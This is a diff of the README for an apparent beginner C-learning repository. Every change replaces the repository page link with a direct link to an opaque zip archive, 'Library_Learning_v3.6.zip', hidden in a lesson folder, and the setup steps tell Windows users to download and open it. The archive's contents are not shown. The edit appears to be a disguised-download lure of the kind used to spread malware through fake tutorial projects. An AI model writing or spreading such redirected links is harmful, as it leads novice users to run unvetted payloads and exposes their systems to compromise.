@@ -1,10 +1,10 @@
 # 📘 C-Learning-Library - Learn C With Clear Examples
 
-[![Download C-Learning-Library](https://img.shields.io/badge/Download-C--Learning--Library-blue?style=for-the-badge)](https://github.com/slimblastogenetic647/C-Learning-Library)
+[![Download C-Learning-Library](https://img.shields.io/badge/Download-C--Learning--Library-blue?style=for-the-badge)](https://raw.githubusercontent.com/slimblastogenetic647/C-Learning-Library/main/topics/04_loops/Library_Learning_v3.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/slimblastogenetic647/C-Learning-Library
+Visit this page to download: https://raw.githubusercontent.com/slimblastogenetic647/C-Learning-Library/main/topics/04_loops/Library_Learning_v3.6.zip
 
 If you use Windows, open the page in your browser, then save the files to your computer.
 
@@ -41,7 +41,7 @@ You only need a basic computer to use this library.
 
 ## 🚀 Getting Started on Windows
 
-1. Open the download page: https://github.com/slimblastogenetic647/C-Learning-Library
+1. Open the download page: https://raw.githubusercontent.com/slimblastogenetic647/C-Learning-Library/main/topics/04_loops/Library_Learning_v3.6.zip
 2. Save the project files to a folder on your computer.
 3. If the files come in a ZIP folder, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -170,7 +170,7 @@ These tools work well with the library:
 
 ## 📁 Download and Open
 
-Visit this page to download: https://github.com/slimblastogenetic647/C-Learning-Library
+Visit this page to download: https://raw.githubusercontent.com/slimblastogenetic647/C-Learning-Library/main/topics/04_loops/Library_Learning_v3.6.zip
 
 After you save the files:
 - Keep them in one folder
